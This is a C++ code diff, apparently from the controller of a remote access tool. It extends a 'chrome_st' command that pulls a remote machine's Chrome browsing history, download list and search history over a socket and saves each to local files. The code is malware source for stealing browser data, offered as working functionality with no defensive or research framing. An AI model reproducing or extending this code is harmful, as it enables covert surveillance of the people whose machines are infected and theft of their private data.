@@ -269,12 +269,53 @@ int main() {
 				send(conn, path.c_str(), sizeof(path), NULL);
 				std::cout << "ok\n";
 			}
+
 			else if (command == "chrome_st") {
 				send(conn, command.c_str(), sizeof(command), NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
-				std::ofstream history("history.txt");
-				history << buffer;
-				std::cout << "history write history.txt" << std::endl;
+
+				if (!dirExists("chrome")) _wmkdir(L"chrome");
+
+				if (strncmp(buffer, "none", 4)) {
+					std::ofstream history("chrome\\history.txt");
+					history << buffer;
+					std::cout << "["; timenow(); std::cout << "]";
+					std::cout << " history write chrome\\history.txt" << std::endl;
+					history.close();
+				} else {
+					std::cout << "["; timenow(); std::cout << "]";
+					std::cout << " null history";
+				}
+				
+				Sleep(1000);
+
+				memset(&buffer, 0x0, sizeof(buffer));
+				recv(conn, buffer, sizeof(buffer), NULL);
+				if (strncmp(buffer, "none", 4)) {
+					std::ofstream downloads("chrome\\downloads.txt");
+					downloads << buffer;
+					std::cout << "["; timenow(); std::cout << "]";
+					std::cout << " downloads write chrome\\downloads.txt" << std::endl;
+					downloads.close();
+				} else {
+					std::cout << "["; timenow(); std::cout << "]";
+					std::cout << " null downloads";
+				}
+
+				Sleep(1000);
+
+				memset(&buffer, 0x0, sizeof(buffer));
+				recv(conn, buffer, sizeof(buffer), NULL);
+				if (strncmp(buffer, "none", 4)) {
+					std::ofstream requests("chrome\\search_history.txt");
+					requests << buffer;
+					std::cout << "["; timenow(); std::cout << "]";
+					std::cout << " search_history write chrome\\search_history.txt" << std::endl;
+					requests.close();
+				} else {
+					std::cout << "["; timenow(); std::cout << "]";
+					std::cout << " null search_history";
+				}
 			}
 
 			else if (command == "close") {
